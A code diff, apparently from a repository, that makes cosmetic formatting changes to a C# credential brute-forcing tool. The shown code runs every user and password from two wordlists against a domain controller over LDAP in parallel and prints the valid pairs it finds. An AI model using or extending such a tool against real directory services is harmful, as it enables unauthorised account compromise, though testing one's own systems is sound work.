@@ -1,11 +1,11 @@
-﻿using System;
+﻿using CommandLine;
+using static System.String;
+using System;
 using System.DirectoryServices.Protocols;
 using System.IO;
 using System.Linq;
 using System.Net;
 using System.Threading.Tasks;
-using CommandLine;
-using static System.String;
 
 namespace BruteForceTool
 {
@@ -28,14 +28,14 @@ namespace BruteForceTool
             try
             {
                 var usersDictionary = File.ReadAllText(options.UsersListPath)
-                .Split(new[] { "\r\n" }, StringSplitOptions.None).Select(_ => _.Trim());
+                    .Split(new[] {"\r\n"}, StringSplitOptions.None).Select(_ => _.Trim());
                 var passwordDictionary = File.ReadAllText(options.PasswordListPath)
-                    .Split(new[] { "\r\n" }, StringSplitOptions.None);
+                    .Split(new[] {"\r\n"}, StringSplitOptions.None);
                 Parallel.ForEach(usersDictionary, (user) =>
                 {
                     Parallel.ForEach(passwordDictionary, (pass) =>
                     {
-                        if (ValidateCredentials(user ,pass ,domain ,authType ,destinationDc ))
+                        if (ValidateCredentials(user, pass, domain, authType, destinationDc))
                         {
                             Console.WriteLine($"Found valid credentials for: {user}, Password: {pass}");
                         }
